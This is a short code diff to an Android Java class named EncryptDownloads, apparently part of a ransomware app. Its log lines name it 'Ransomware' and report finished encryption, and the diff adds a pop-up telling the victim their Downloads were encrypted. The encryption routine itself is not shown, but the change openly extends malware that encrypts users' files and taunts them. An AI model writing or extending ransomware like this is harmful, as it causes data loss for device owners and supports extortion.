@@ -5,6 +5,7 @@ import android.os.Environment;
 import android.util.Log;
 import android.view.View;
 import android.widget.TextView;
+import android.widget.Toast;
 
 import java.io.File;
 import java.io.IOException;
@@ -46,5 +47,7 @@ public class EncryptDownloads {
                 Log.e("Ransomware", "Finished encrypting.");
             }
         }
+        Toast.makeText(a, "Your Downloads were just encrypted... Oopsie", Toast.LENGTH_LONG).show();
+
     }
 }
